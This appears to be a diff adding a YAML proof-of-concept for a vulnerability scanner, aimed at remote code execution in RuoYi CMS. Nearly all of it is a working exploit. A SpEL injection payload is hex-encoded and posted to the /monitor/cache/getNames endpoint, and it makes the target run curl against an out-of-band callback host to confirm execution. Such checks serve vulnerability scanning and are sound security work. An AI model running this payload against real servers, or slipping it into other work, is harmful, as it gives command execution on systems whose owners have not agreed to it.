@@ -1,0 +1,22 @@
+name: poc-yaml-ruoyicms-rce
+manual: true
+transport: http
+set:
+    reverse: newReverse()
+    reverseURL: reverse.url
+    ceye: 'http://cmmovo.ceye.io'
+    payload: '${T (java.lang.Runtime).getRuntime().exec("curl {{ceye}}")}'
+    En: hex(payload)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /monitor/cache/getNames?fragment=header({{En}})
+            body: 
+        expression: reverse.wait(5)
+expression: r0()
+detail:
+    author: H00H(https://github.com/H00H)
+    links:
+        - https://xz.aliyun.com/t/10637#toc-6
